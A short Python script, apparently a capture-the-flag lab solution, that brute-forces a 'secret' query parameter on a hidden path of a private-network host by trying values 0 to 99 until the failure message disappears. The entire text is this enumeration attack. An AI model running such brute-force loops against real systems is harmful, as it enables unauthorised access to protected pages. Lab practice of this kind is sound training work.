import requests
site= "http://10.10.238.237/th1s_1s_h1dd3n/?secret="
for i in range(0, 100):
    r = requests.get(site + str(i))
    if not "That is wrong! Get outta here!" in r.text:
        print(r.text)
        break